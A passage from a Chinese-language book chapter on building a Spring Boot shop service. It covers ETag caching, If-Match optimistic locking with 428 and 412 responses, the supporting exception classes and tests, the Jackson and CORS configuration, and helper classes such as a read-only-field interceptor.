        if (webRequest.checkNotModified(etag, product.updatedAt().toEpochMilli())) {
            return null;                                 // ★ 回 null 是正確的
        }

        return ResponseEntity.ok()
                .eTag(etag)
                .cacheControl(CacheControl.maxAge(Duration.ofMinutes(5)).cachePublic())
                .body(mapper.toResponse(product));
    }
```

| | 手動比對 | `checkNotModified` |
|---|---|---|
| 程式碼量 | 多約 8 行 | 少 |
| **可以「快速 304」** | ✅（在完整查詢之前判斷） | 🔴 **不行**（它需要 ETag，而 ETag 需要資料） |
| 同時處理 `If-Modified-Since` | 要自己寫 | ✅ 免費 |
| 回 `null` 的行為 | — | ⚠️ 需要知道「回 null 是對的」（不直觀） |

**shop-service 的用法**：

| 端點 | 做法 | 理由 |
|---|---|---|
| `GET /orders/{id}` | 手動 + 快速 304 | 訂單詳情很貴（JOIN items、payments） |
| `GET /products/{id}` | `checkNotModified` | 商品查詢很便宜，而且有 Redis 快取 |
| `GET /categories` | `ShallowEtagHeaderFilter` | 沒有版本欄位（它是一棵組出來的樹） |
| `GET /orders` (列表) | ❌ **不加 ETag** | 列表的內容依賴很多筆資料，任何一筆變了 ETag 就變 → 命中率極低，不值得 |

⚠️ **最後一列是一個常被忽略的判斷**：
**集合端點的 ETag 通常沒有價值**，因為「集合裡任何一個成員改變」都會讓它失效。
一個活躍的訂單列表可能每分鐘都在變。

### 6.8.3 `If-Match`：樂觀鎖的 HTTP 表達

**問題**（03-rest-api 8.3.5）：

```
09:00  客服 A 開啟訂單 ord_1（收件人：王小明）
09:01  客服 B 開啟同一張訂單
09:02  客服 A 把收件人改成「王大明」→ 儲存成功
09:03  客服 B 把電話改成「0912…」→ 儲存成功
       🔴 B 送的是它 09:01 看到的完整物件 → 收件人被改回「王小明」
       ★ A 的修改被靜默覆蓋，而且沒有人知道
```

**`If-Match` 讓它變成一個明確的 409/412**：

```http
PATCH /orders/ord_1
If-Match: W/"7-a3f2b1c8"
Content-Type: application/merge-patch+json

{ "customerPhone": "0912345678" }

→ 412 Precondition Failed
{
  "code": "OPTIMISTIC_LOCK_CONFLICT",
  "userMessage": "這筆訂單在您編輯期間已被他人修改，請重新載入後再試。",
  "retryable": true,
  "retryStrategy": "REFETCH_THEN_RETRY",
  "currentVersion": 8,
  "yourVersion": 7
}
```

```java
package example.shop.order.web;

import example.shop.common.error.ErrorCode;
import example.shop.common.web.ETags;
import example.shop.common.web.CurrentActor;
import example.shop.order.domain.Actor;
import org.springframework.http.*;
import org.springframework.web.bind.annotation.*;

/**
 * 訂單的修改端點。
 *
 * <p>★ 三個層次的併發控制：
 * <ol>
 *   <li><b>{@code If-Match} 必填</b> —— 沒帶就回 428 Precondition Required。
 *       這比「沒帶就不檢查」安全得多（那會讓客戶端「忘記帶」變成一個靜默的漏洞）。</li>
 *   <li><b>Web 層的比對</b> —— 快速失敗，不用進 Service。</li>
 *   <li><b>資料庫的 {@code @Version}</b> —— 真正的保證
 *       （Web 層的比對到 UPDATE 之間仍有競態，見下面的警告）。</li>
 * </ol>
 */
@RestController
@RequestMapping("/orders/{orderId}")
public class OrderUpdateController {

    /**
     * 修改訂單。
     *
     * <p>⚠️ {@code If-Match} 的三種情況：
     * <table>
     *   <tr><th>請求</th><th>回應</th></tr>
     *   <tr><td>沒有 If-Match</td><td><b>428 Precondition Required</b></td></tr>
     *   <tr><td>If-Match 不匹配</td><td><b>412 Precondition Failed</b></td></tr>
     *   <tr><td>If-Match 匹配</td><td>執行修改 → 200（新的 ETag）</td></tr>
     * </table>
     */
    @PatchMapping(consumes = "application/merge-patch+json")
    public ResponseEntity<OrderDetail> update(
            @PathVariable("orderId") String orderId,
            @RequestHeader(value = HttpHeaders.IF_MATCH, required = false) String ifMatch,
            @RequestBody @Valid UpdateOrderRequest request,
            @CurrentActor Actor actor) {

        // ── ① If-Match 必填 ────────────────────────────────────────
        if (ifMatch == null || ifMatch.isBlank()) {
            throw new IfMatchRequiredException(orderId);
        }

        // ── ② 取當前版本並比對 ─────────────────────────────────────
        var current = orderService.getVersionInfo(orderId, actor);
        String representation = actor.isInternal() ? "support" : "customer";
        String currentETag = ETags.of(current.version(), current.updatedAt(), representation);

        if (!ETags.strongMatch(ifMatch, currentETag)) {
            throw new OptimisticLockConflictException(
                    orderId,
                    current.version(),
                    ETags.versionOf(ifMatch).orElse(-1L));
        }

        // ── ③ 執行修改（Service 內仍有 @Version 的保證）─────────────
        // ⚠️ 這裡到 Service 的 UPDATE 之間仍有競態：
        //    另一個請求可能在這 3 ms 內完成修改。
        //    所以 Service 層【必須】也有樂觀鎖 ——
        //    Web 層的比對只是「快速失敗」與「明確的錯誤訊息」，
        //    不是併發的保證。
        var result = orderService.update(
                mapper.toCommand(orderId, request, actor, current.version()));

        String newETag = ETags.of(result.version(), result.updatedAt(), representation);

        return ResponseEntity.ok()
                .eTag(newETag)
                .cacheControl(CacheControl.noStore())     // ★ 修改後的回應不可快取
                .body(mapper.toDetail(result, actor));
    }
}
```

```java
package example.shop.order.web;

import example.shop.common.error.BusinessException;
import example.shop.common.error.ErrorCode;

import java.util.List;
import java.util.Map;

/**
 * 缺少 {@code If-Match} 標頭。
 *
 * <p>★ 為什麼是 428 而不是 400：
 * RFC 6585 §3 專門為這個情況定義了 428 Precondition Required ——
 * 語意是「伺服器要求這個請求必須是條件請求」。
 *
 * <p>★★ 錯誤訊息必須告訴客戶端「怎麼拿到 ETag」——
 * 不然它只知道「要一個 If-Match」但不知道值從哪來。
 */
public class IfMatchRequiredException extends BusinessException {
    public IfMatchRequiredException(String orderId) {
        super(ErrorCode.IF_MATCH_REQUIRED,
              "The If-Match header is required for this request.",
              null,
              Map.of("requiredHeader", "If-Match",
                     "howToObtain", "GET /orders/%s 的回應標頭 ETag".formatted(orderId),
                     "hint", "修改訂單必須帶 If-Match 標頭以避免覆蓋他人的變更。"
                           + "請先 GET 該訂單，取得回應的 ETag 標頭，"
                           + "再把它放進 If-Match。"),
              new Object[0],
              List.of());
    }
}
```

```java
package example.shop.order.web;

import example.shop.common.error.BusinessException;
import example.shop.common.error.ErrorCode;

import java.util.List;
import java.util.Map;

/**
 * 樂觀鎖衝突。
 *
 * <p>★ {@code retryStrategy} 是 {@code REFETCH_THEN_RETRY}（03 章 3.4.2）——
 * 客戶端必須「重新取得資源再重試」而不是「直接重試」。
 * 直接重試會拿到同樣的 412。
 */
public class OptimisticLockConflictException extends BusinessException {
    public OptimisticLockConflictException(String orderId, long currentVersion,
                                          long clientVersion) {
        super(ErrorCode.OPTIMISTIC_LOCK_CONFLICT,
              "The resource has been modified since version %d (current: %d)."
                      .formatted(clientVersion, currentVersion),
              null,
              buildExtensions(orderId, currentVersion, clientVersion),
              new Object[0],
              List.of());
    }

    private static Map<String, Object> buildExtensions(String orderId,
                                                       long currentVersion,
                                                       long clientVersion) {
        var map = new java.util.LinkedHashMap<String, Object>();
        map.put("currentVersion", currentVersion);
        if (clientVersion >= 0) {
            map.put("yourVersion", clientVersion);
        }
        // ★ 給客戶端一個「去哪裡拿最新版」的連結
        map.put("refetchUrl", "/orders/" + orderId);
        map.put("hint", "這筆訂單在您編輯期間已被他人修改。"
                      + "請重新載入後確認變更再送出。");
        return map;
    }
}
```

⚠️ **`412` 與 `409` 的區別**（很多人混用）：

| 狀態 | 語意 | shop-service 的用法 |
|---|---|---|
| **412 Precondition Failed** | 「你的**條件請求**的前置條件不成立」 | `If-Match` 不匹配 |
| **409 Conflict** | 「請求與資源的**當前狀態**衝突」 | 訂單已付款無法取消（狀態機） |

**判準**：**如果客戶端「重新取得資源再重試」就能成功 → 412；
如果那樣做還是不行（狀態根本不允許）→ 409。**

**一個容易漏掉的細節：`If-Match` 也要 expose ETag。**

```
客戶端要能讀 ETag 才能送 If-Match
  → ETag 必須在 Access-Control-Expose-Headers 裡（6.3.5 已列入）✅
```

⚠️ **沒有 expose 的話，整個樂觀鎖機制在瀏覽器上完全無法使用** ——
而症狀是「前端永遠拿到 428」，前端工程師會以為後端壞了。
**這是 6.3.3 那張表的價值的最好例子。**

**測試**：

```java
    @Test
    @DisplayName("★ 完整的樂觀鎖流程")
    void 樂觀鎖() throws Exception {
        // ① GET 取得 ETag
        String etag = mockMvc.perform(get("/orders/ord_1").with(support("stf_1")))
                .andExpect(status().isOk())
                .andExpect(header().exists(HttpHeaders.ETAG))
                .andReturn().getResponse().getHeader(HttpHeaders.ETAG);

        // ② 沒帶 If-Match → 428
        mockMvc.perform(patch("/orders/ord_1")
                        .contentType("application/merge-patch+json")
                        .content("{\"customerNote\":\"x\"}")
                        .with(support("stf_1")))
                .andExpect(status().isPreconditionRequired())
                .andExpect(jsonPath("$.code").value("IF_MATCH_REQUIRED"))
                .andExpect(jsonPath("$.howToObtain").exists());

        // ③ 帶正確的 If-Match → 200，而且回新的 ETag
        String newEtag = mockMvc.perform(patch("/orders/ord_1")
                        .header(HttpHeaders.IF_MATCH, etag)
                        .contentType("application/merge-patch+json")
                        .content("{\"customerNote\":\"第一次修改\"}")
                        .with(support("stf_1")))
                .andExpect(status().isOk())
                .andExpect(header().exists(HttpHeaders.ETAG))
                .andReturn().getResponse().getHeader(HttpHeaders.ETAG);

        assertThat(newEtag).isNotEqualTo(etag);

        // ④ 用【舊的】 ETag 再修改 → 412
        mockMvc.perform(patch("/orders/ord_1")
                        .header(HttpHeaders.IF_MATCH, etag)         // ★ 過期的
                        .contentType("application/merge-patch+json")
                        .content("{\"customerNote\":\"第二次修改\"}")
                        .with(support("stf_1")))
                .andExpect(status().isPreconditionFailed())
                .andExpect(jsonPath("$.code").value("OPTIMISTIC_LOCK_CONFLICT"))
                .andExpect(jsonPath("$.currentVersion").exists())
                .andExpect(jsonPath("$.yourVersion").exists())
                .andExpect(jsonPath("$.refetchUrl").value("/orders/ord_1"))
                .andExpect(jsonPath("$.retryStrategy").value("REFETCH_THEN_RETRY"));

        // ⑤ 確認第一次的修改沒有被覆蓋
        mockMvc.perform(get("/orders/ord_1").with(support("stf_1")))
                .andExpect(jsonPath("$.customerNote").value("第一次修改"));
    }

    @Test
    @DisplayName("★ If-Match: * 表示「只要存在就好」")
    void ifMatchStar() throws Exception {
        mockMvc.perform(patch("/orders/ord_1")
                        .header(HttpHeaders.IF_MATCH, "*")
                        .contentType("application/merge-patch+json")
                        .content("{\"customerNote\":\"x\"}")
                        .with(support("stf_1")))
                .andExpect(status().isOk());
    }

    @Test
    @DisplayName("★ 304 不可以有 body")
    void 三零四無body() throws Exception {
        String etag = mockMvc.perform(get("/orders/ord_1").with(support("stf_1")))
                .andReturn().getResponse().getHeader(HttpHeaders.ETAG);

        var response = mockMvc.perform(get("/orders/ord_1")
                        .header(HttpHeaders.IF_NONE_MATCH, etag)
                        .with(support("stf_1")))
                .andExpect(status().isNotModified())
                // ★ 304 必須帶 ETag（RFC 9110 §15.4.5）
                .andExpect(header().string(HttpHeaders.ETAG, etag))
                .andReturn().getResponse();

        assertThat(response.getContentAsString())
                .as("304 的回應不可以有 body")
                .isEmpty();
    }

    @Test
    @DisplayName("★ 客戶與客服的 ETag 不同（表述不同）")
    void 不同表述不同ETag() throws Exception {
        String customerEtag = mockMvc.perform(get("/orders/ord_1").with(customer("cus_1")))
                .andReturn().getResponse().getHeader(HttpHeaders.ETAG);
        String supportEtag = mockMvc.perform(get("/orders/ord_1").with(support("stf_1")))
                .andReturn().getResponse().getHeader(HttpHeaders.ETAG);

        assertThat(customerEtag)
                .as("""
                    客戶版與客服版的 ETag 相同 —— 這是一個快取污染漏洞。
                    客服如果先請求，CDN / 瀏覽器可能把客服版（含 internalNote、
                    riskScore）快取起來給客戶看到（06 章 6.8.2）。
                    """)
                .isNotEqualTo(supportEtag);
    }
```

⚠️ **最後那個測試是一個真實的漏洞類型**（03-rest-api 8.5.2）。
`Vary: Authorization` 是主要防護，但**讓 ETag 本身包含表述識別是第二層** ——
即使某個代理忽略了 `Vary`，不同的 ETag 也會讓 `If-None-Match` 不匹配。

---

## 6.9 shop-service 落地清單

### 6.9.1 這一章新增的檔案

```
src/main/java/example/shop/
├── common/
│   ├── config/
│   │   ├── CorsConfig.java                     ★ CorsFilter (-200) + 三組設定（6.3.5）
│   │   ├── CorsProperties.java                 允許的來源（6.3.5）
│   │   ├── CorsConfigurationValidator.java     啟動時檢查（6.3.6）
│   │   ├── ContentNegotiationConfig.java       「記錄不做什麼」（6.4.3）
│   │   ├── MessageConverterConfig.java         ★ extendMessageConverters（6.4.5）
│   │   ├── ConversionConfig.java               嚴格的 enum 轉換（6.5.8）
│   │   ├── JacksonConfig.java                  ★ module + StreamReadConstraints（6.5.7）
│   │   └── SecondaryObjectMapperConfig.java    persistenceObjectMapper（6.5.2）
│   ├── web/
│   │   ├── ProblemWriter.java                  ★ 修：保留 CORS 標頭（6.3.5）
│   │   ├── VaryOriginOptimizationFilter.java   CDN 命中率（6.3.7）
│   │   ├── JsonCharsetFilter.java              拒絕非 UTF-8 的 JSON（6.4.2）
│   │   ├── SparseFieldsetAdvice.java           ?fields=（6.6.4）
│   │   ├── StreamingUnsupportedParamInterceptor.java  拒絕靜默忽略（6.6.6）
│   │   ├── ETags.java                          ETag 產生與比對（6.8.2）
│   │   ├── ReadOnlyField.java                  唯讀欄位標記（6.5.5）
│   │   ├── ReadOnlyFieldInterceptor.java       唯讀欄位的檢查（6.9.3）
│   │   ├── json/
│   │   │   ├── FixedPrecisionInstantSerializer.java   毫秒精度（6.5.6）
│   │   │   ├── LenientInstantDeserializer.java        寬容輸入（6.5.6）
│   │   │   ├── InstantParsing.java                    ★ body 與查詢參數共用（6.6.1）
│   │   │   ├── MaskedCardNumber.java                  型別層級的遮蔽（6.6.2）
│   │   │   ├── Masked.java                            @Masked 註解（6.6.2）
│   │   │   └── MaskingSerializer.java                 ContextualSerializer（6.6.2）
│   │   ├── converter/
│   │   │   ├── CsvHttpMessageConverter.java           List<T> → CSV（6.4.4）
│   │   │   ├── CsvRowMapper.java
│   │   │   └── CsvRowMapperRegistry.java
│   │   └── convert/
│   │       ├── StrictStringToEnumConverterFactory.java  未知 enum 明確報錯（6.5.8）
│   │       └── StringToInstantConverter.java            查詢參數的時間（6.6.1）
│   └── validation/
│       ├── SafeMetadata.java                   Map 欄位的驗證（6.7.2）
│       └── SafeMetadataValidator.java
├── order/
│   ├── web/
│   │   ├── MoneyFormat.java                    ★ 金額格式化的唯一入口（6.5.7）
│   │   ├── LabeledEnum.java                    ★ 「有顯示文字的 enum」（6.5.8）
│   │   ├── StatusLabelResolver.java            enum → 顯示文字（6.5.8）
│   │   ├── OrderUpdateController.java          If-Match 樂觀鎖（6.8.3）
│   │   ├── IfMatchRequiredException.java
│   │   ├── OptimisticLockConflictException.java
│   │   └── csv/
│   │       └── OrderSummaryCsvRowMapper.java   CSV 欄位契約（6.4.4）
│   └── domain/
│       └── Money.java                          （備選方案，未採用，6.5.7）
├── payment/web/dto/
│   ├── PaymentMethodRequest.java               ★ sealed + @JsonSubTypes（6.7.1）
│   ├── CreditCardPayment.java
│   ├── BankTransferPayment.java
│   └── CashOnDeliveryPayment.java
└── arch/
    ├── ObjectMapperUsageTest.java              不可 new ObjectMapper（6.5.2）
    └── DtoTypeRulesTest.java                   DTO 不可用 LocalDateTime / Entity（6.5.6、6.7.5）

src/test/java/example/shop/
├── contract/
│   ├── JacksonContractTest.java                ★ 關鍵設定沒被改（6.5.10）
│   ├── JsonNamingConventionTest.java           camelCase（6.5.4）
│   ├── StatusLabelCompletenessTest.java        每個 enum 有 label（6.5.8）
│   ├── SealedSubtypeConsistencyTest.java       permits 與 JsonSubTypes 一致（6.7.1）
│   ├── DtoSerializabilityTest.java             全 null 也能序列化（6.7.4）
│   ├── ResponseBodyAdviceCoverageTest.java     串流端點清單（6.6.6）
│   └── SensitiveFieldScanTest.java             回應不含敏感欄位（6.10.5）
├── common/web/
│   ├── CorsOnErrorResponsesTest.java           ★★ 每種錯誤都有 CORS（6.3.5）
│   ├── ETagsTest.java
│   └── RangeSupportRegressionTest.java         守住 Range（6.4.5）
└── security/
    └── JsonBombTest.java                       深度／字串／數字炸彈（6.7.3）

scripts/
├── cors-check.sh                               CORS 診斷（6.3.9）
└── check-dto-logging.sh                        DTO 不進 log（6.6.2）
```

### 6.9.2 完整的設定（這一章相關）

```yaml
spring:
  jackson:
    default-property-inclusion: non_null
    time-zone: UTC
    serialization:
      write-dates-as-timestamps: false
      write-durations-as-timestamps: false
      fail-on-empty-beans: false
      indent-output: false
      order-map-entries-by-keys: true
      fail-on-self-references: true
    deserialization:
      fail-on-unknown-properties: true
      fail-on-null-for-primitives: true
      read-unknown-enum-values-using-default-value: false   # ★ 6.5.8 的最終決定
      use-big-decimal-for-floats: true
      accept-single-value-as-array: false
      fail-on-missing-creator-properties: false             # ★ 讓驗證去報錯（6.5.3）
    mapper:
      accept-case-insensitive-enums: false
      accept-case-insensitive-properties: false
      default-view-inclusion: false
    generator:
      write-bigdecimal-as-plain: true
      escape-non-ascii: false
    parser:
      allow-comments: false
      allow-single-quotes: false
      allow-unquoted-field-names: false
      allow-trailing-comma: false
      allow-non-numeric-numbers: false

  mvc:
    # ⚠️ Boot 3 沒有 favor-path-extension（Spring 6 已移除，6.4.3）
    contentnegotiation:
      favor-parameter: false        # ★ 明確關閉（與 UnknownQueryParamInterceptor 衝突）

api:
  cors:
    allowed-origins:
      - https://shop.example
      - https://admin.shop.example
      - https://ops.shop.example
    origin-patterns: []             # ★ prod 必須為空（CorsConfigurationValidator 強制）

  json:
    max-nesting-depth: 50           # 6.7.3
    max-string-length: 1000000
    max-document-length: 2000000
    max-name-length: 256

  sparse-fields:
    enabled: true                   # 6.6.4
    max-fields: 50
    max-depth: 4

  etag:
    enabled: true                   # 6.8
    # ShallowEtagHeaderFilter 只套用在這些路徑（6.8.1）
    shallow-etag-paths:
      - /statistics/*
      - /categories/*

  diagnostics:
    enabled: false                  # ★ prod 一定要 false（6.5.1 的診斷端點）

---
spring:
  config:
    activate:
      on-profile: local
api:
  cors:
    allowed-origins:
      - http://localhost:5173
      - http://127.0.0.1:5173       # ⚠️ 與 localhost 是不同的 origin（6.3.5）
      - http://localhost:3000
    origin-patterns:
      - "http://localhost:[*]"      # ⚠️ 注意 [*] 的語法（6.3.6）
  diagnostics:
    enabled: true

---
spring:
  config:
    activate:
      on-profile: dev
api:
  cors:
    allowed-origins:
      - https://dev.shop.example
    origin-patterns:
      - "https://pr-*.preview.shop.example"
```

### 6.9.3 支援型別：前面用到但還沒定義的東西

**和 04 章 4.13.6、05 章 5.12.4 一樣，這一節把缺的補完。**

#### `ReadOnlyFieldInterceptor`：6.5.5 的檢查

```java
package example.shop.common.web;

import com.fasterxml.jackson.databind.ObjectMapper;
import example.shop.common.error.ErrorCode;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.core.MethodParameter;
import org.springframework.stereotype.Component;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.method.HandlerMethod;
import org.springframework.web.servlet.HandlerInterceptor;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

/**
 * 拒絕客戶端修改 {@link ReadOnlyField} 標記的欄位。
 *
 * <p>★ 為什麼是 Interceptor 而不是 Bean Validation：
 * 驗證回報的是 422（「這個值不對」），
 * 而「你不可以改這個欄位」的語意是 <b>403</b>（03 章的 {@code FORBIDDEN_PARAMETER}）。
 *
 * <p>★ 為什麼不用 {@code @JsonIgnore}（讓 Jackson 直接忽略它）：
 * 那是<b>靜默忽略</b> —— 客戶端會以為它成功改了 status
 * （01 章 1.7.5、04 章 4.2.3 都是同一個災難模式）。
 *
 * <p>⚠️ 這個 interceptor 需要讀 request body，所以它依賴
 * 04 章 4.4.6 的 {@code CachedBodyFilter}（可重複讀的 body）。
 * 沒有那個 filter 的話它讀完 body，Controller 就讀不到了。
 */
@Component
public class ReadOnlyFieldInterceptor implements HandlerInterceptor {

    /** handler → 唯讀欄位名稱的快取（反射很貴，只做一次）。 */
    private final Map<HandlerMethod, List<ReadOnlyFieldInfo>> cache =
            new ConcurrentHashMap<>();

    private final ObjectMapper objectMapper;
    private final ProblemWriter problemWriter;

    public ReadOnlyFieldInterceptor(ObjectMapper objectMapper, ProblemWriter problemWriter) {
        this.objectMapper = objectMapper;
        this.problemWriter = problemWriter;
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response,
                             Object handler) throws Exception {

        if (!(handler instanceof HandlerMethod method)) {
            return true;
        }
        // ★ 只有有 body 的方法需要檢查
        String httpMethod = request.getMethod();
        if (!"POST".equals(httpMethod) && !"PUT".equals(httpMethod)
                && !"PATCH".equals(httpMethod)) {
            return true;
        }

        List<ReadOnlyFieldInfo> readOnlyFields =
                cache.computeIfAbsent(method, ReadOnlyFieldInterceptor::scan);
        if (readOnlyFields.isEmpty()) {
            return true;
        }

        // ★ 讀 body（依賴 CachedBodyFilter 讓它可重複讀）
        byte[] body = request.getInputStream().readAllBytes();
        if (body.length == 0) {
            return true;
        }

        com.fasterxml.jackson.databind.JsonNode tree;
        try {
            tree = objectMapper.readTree(body);
        } catch (Exception e) {
            // ⚠️ 壞掉的 JSON 不是我們的責任 —— 讓 Jackson 在綁定時報錯
            //   （那裡有 03 章 3.9.4 的完整分析）
            return true;
        }

        List<String> violated = new ArrayList<>();
        for (ReadOnlyFieldInfo field : readOnlyFields) {
            if (tree.has(field.name())) {
                violated.add(field.name());
            }
        }

        if (violated.isEmpty()) {
            return true;
        }

        Map<String, Object> extensions = new LinkedHashMap<>();
        extensions.put("readOnlyFields", violated);
        extensions.put("hint", "以下欄位不可修改：%s。請從請求中移除它們。"
                .formatted(String.join("、", violated)));

        problemWriter.write(request, response, ErrorCode.FORBIDDEN_PARAMETER,
                "The request contains read-only fields: " + String.join(", ", violated),
                extensions);
        return false;
    }

    /**
     * 掃描 handler 的 {@code @RequestBody} 參數，找出 {@link ReadOnlyField} 的元件。
     *
     * <p>⚠️ 只掃一層 —— 巢狀物件裡的唯讀欄位不會被偵測到。
     * 那是一個刻意的限制：遞迴掃描會很慢，而且會有循環的問題。
     * 需要巢狀檢查的話，把那個巢狀型別的唯讀欄位提到外層 DTO。
     */
    private static List<ReadOnlyFieldInfo> scan(HandlerMethod method) {
        for (MethodParameter parameter : method.getMethodParameters()) {
            if (!parameter.hasParameterAnnotation(RequestBody.class)) {
                continue;
            }
            Class<?> type = parameter.getParameterType();
            if (!type.isRecord()) {
                // ⚠️ 只支援 record（@ReadOnlyField 的 @Target 是 RECORD_COMPONENT）
                continue;
            }
            List<ReadOnlyFieldInfo> result = new ArrayList<>();
            for (var component : type.getRecordComponents()) {
                ReadOnlyField annotation = component.getAnnotation(ReadOnlyField.class);
                if (annotation != null) {
                    // ★ 要用 JSON 的欄位名（可能被 @JsonProperty 改過）
                    var jsonProperty = component.getAnnotation(
                            com.fasterxml.jackson.annotation.JsonProperty.class);
                    String name = (jsonProperty != null && !jsonProperty.value().isEmpty())
                            ? jsonProperty.value()
                            : component.getName();
                    result.add(new ReadOnlyFieldInfo(name, annotation.value()));
                }
            }
            return List.copyOf(result);
        }
        return List.of();
    }

    record ReadOnlyFieldInfo(String name, String reason) {}
}
```

#### `ValueMasker`：03 章 3.9.6 的複用

這一章的 `StrictStringToEnumConverterFactory`（6.5.8）與
`SparseFieldsetAdvice`（6.6.4）都用到它。**原樣搬來讓這一章自足**：

> ### ⚠️ `ValueMasker` 與 `Suggestions`：兩個「差點被重複定義」的類別 ★★
>
> 這一章有六個地方呼叫 `ValueMasker.mask(...)`、一個地方呼叫「拼字建議」。
> **而它們都已經在 03 章定義過了** ——
> 這一節原本重新寫了一份，那是一個真實的錯誤，值得留下紀錄：
>
> | 這一章原本寫的 | 03 章已經有的 | 衝突 |
> |---|---|---|
> | `ValueMasker.mask(Object)`（一個參數） | `ValueMasker.mask(String field, Object value)` | 🔴 **同一個 FQN、兩種不相容的簽名** —— 全書 9 個呼叫點有 6 個用一參數、3 個用兩參數，**不可能同時編譯** |
> | `Suggestions.closest(String, Collection)` | `DidYouMean.closest(String, List)` | 🔴 **兩份 Levenshtein 實作**，門檻規則還不一樣（比例 vs 固定距離 3） |
>
> **★ 修法（已套用）**：
>
> | 問題 | 做法 |
> |---|---|
> | `ValueMasker` 的兩種簽名 | 在 **03 章** 的類別上加一個 `mask(Object)` 多載（給「沒有欄位名可用」的 Converter 與 type-id handler）。**這一章不再定義它。** |
> | 兩份 Levenshtein | 統一用 03 章的 `DidYouMean`，並把這一章比較好的**比例門檻**搬進去（3.9.5）。**這一章不再定義 `Suggestions`。** |
>
> ⚠️ **一般教訓**：寫到第六章時「這個小工具好像沒有」是一個很自然的感覺 ——
> 而它幾乎總是錯的。
> **在定義任何 `common` 的工具類別之前，先搜尋一次類別名與方法名。**
> 05 章 5.12.4 的那個 `comm -23` 腳本就是為此存在的。



#### `InstanceFactory`：測試用的 DTO 實例產生器（6.7.4 用到）

```java
package example.shop.contract;

import java.lang.reflect.Constructor;
import java.lang.reflect.RecordComponent;
import java.math.BigDecimal;
import java.time.Instant;
import java.time.LocalDate;
import java.util.List;
import java.util.Map;
import java.util.Set;

/**
 * 為測試產生 DTO 的實例。
 *
 * <p>★ 為什麼自己寫而不用 {@code instancio} / {@code easy-random}：
 * <ul>
 *   <li>我們只需要兩種實例（全 null、全填滿），不需要隨機性。</li>
 *   <li><b>「全 null」是那些程式庫做不到的</b>——
 *       它們的設計目標是「產生合理的資料」。
 *       而 6.7.4 要測的正是「不合理的資料」。</li>
 * </ul>
 *
 * <p>⚠️ 這個類別只在測試裡用，所以可以用反射與不安全的假設。
 */
public final class InstanceFactory {

    /** 產生一個「所有可為 null 的欄位都是 null」的實例。 */
    public static Object allNulls(Class<?> recordType) {
        return build(recordType, true, 0);
    }

    /** 產生一個「所有欄位都有值」的實例。 */
    public static Object allFilled(Class<?> recordType) {
        return build(recordType, false, 0);
    }

    private static Object build(Class<?> type, boolean nulls, int depth) {
        if (depth > 5) {
            // ⚠️ 防止循環參照造成無限遞迴
            return null;
        }
        if (!type.isRecord()) {
            throw new IllegalArgumentException("只支援 record：" + type.getName());
        }

        RecordComponent[] components = type.getRecordComponents();
        Object[] args = new Object[components.length];
        Class<?>[] paramTypes = new Class<?>[components.length];

        for (int i = 0; i < components.length; i++) {
            paramTypes[i] = components[i].getType();
            args[i] = value(components[i], nulls, depth);
        }

        try {
            Constructor<?> constructor = type.getDeclaredConstructor(paramTypes);
            constructor.setAccessible(true);
            return constructor.newInstance(args);
        } catch (ReflectiveOperationException e) {
            // ⚠️ 正規化建構子可能拒絕 null（例如 6.5.7 的 Money）——
            //    那時「全 null」的實例產生不出來，而那本身就是好事（型別在保護我們）。
            //    回 null 讓測試跳過它。
            throw new IllegalStateException(
                    "無法建立 %s 的實例（正規化建構子可能拒絕了這些值）：%s"
                            .formatted(type.getSimpleName(), e.getMessage()), e);
        }
    }

    private static Object value(RecordComponent component, boolean nulls, int depth) {
        Class<?> type = component.getType();

        // ★ 原始型別不能是 null
        if (type.isPrimitive()) {
            return switch (type.getName()) {
                case "boolean" -> false;
                case "int"     -> 0;
                case "long"    -> 0L;
                case "double"  -> 0.0d;
                case "float"   -> 0.0f;
                case "short"   -> (short) 0;
                case "byte"    -> (byte) 0;
                case "char"    -> ' ';
                default        -> null;
            };
        }

        if (nulls) {
            return null;
        }

        // ── 全填滿 ───────────────────────────────────────────────
        if (type == String.class)      return "sample";
        if (type == Integer.class)     return 1;
        if (type == Long.class)        return 1L;
        if (type == Boolean.class)     return Boolean.TRUE;
        if (type == BigDecimal.class)  return new BigDecimal("1.00");
        if (type == Instant.class)     return Instant.parse("2026-08-24T03:14:22Z");
        if (type == LocalDate.class)   return LocalDate.of(2026, 8, 24);
        if (type.isEnum())             return type.getEnumConstants()[0];
        if (List.class.isAssignableFrom(type))  return List.of();
        if (Set.class.isAssignableFrom(type))   return Set.of();
        if (Map.class.isAssignableFrom(type))   return Map.of();
        if (type.isRecord())           return build(type, false, depth + 1);

        // ⚠️ 未知型別 → null（並讓測試在需要時失敗）
        return null;
    }

    private InstanceFactory() {}
}
```

#### 這一章新增的 `ErrorCode`

03 章的 `ErrorCode` enum 要加兩個常數：

```java
    // ── 400：新增於 06 章 ────────────────────────────────────────
    // ⚠️ 這兩個其實已經存在（UNKNOWN_PARAMETER、FORBIDDEN_PARAMETER），
    //    這一章只是給了它們新的使用情境：
    //      · UNKNOWN_PARAMETER  → 串流端點的 ?fields=（6.6.6）
    //      · FORBIDDEN_PARAMETER → @ReadOnlyField（6.5.5）
    //    ★ 這是一個好現象：03 章的錯誤碼註冊表設計得夠通用。
```

**唯一真正的新增**：

```java
    // ── 406：這一章第一次真正用到它 ───────────────────────────────
    // NOT_ACCEPTABLE 在 03 章就有了，但 06 章 6.4.2 才給了它明確的觸發情境
```

**i18n 訊息的補充**：

⚠️⚠️ **這一章「沒有」新增任何 `ErrorCode`，也沒有新增任何錯誤訊息。**

`NOT_ACCEPTABLE`、`FORBIDDEN_PARAMETER`、`IF_MATCH_REQUIRED`、
`OPTIMISTIC_LOCK_CONFLICT` 的訊息**都已經在 03 章 3.4.4 定義好了** ——
這一章只是讓它們有了新的觸發情境。

> **★ 而「不要重複定義」是一條需要明說的規則**：
> properties 的同一個 key 只有**最後一次**定義生效，而 Spring **不會警告**。
> 這一節的第一版真的重寫了那四個 key（文案還不一樣）——
> 於是「哪一份生效」取決於它們在檔案裡的先後，而那是一個
> **看不出來、也測不到**的問題（07 章 7.8.2 的契約測試只檢查
> 「有沒有訊息」與「格式對不對」，不檢查「定義了幾次」）。
>
> **一個 `ErrorCode` 的訊息只能有一個定義處：03 章 3.4.4。**
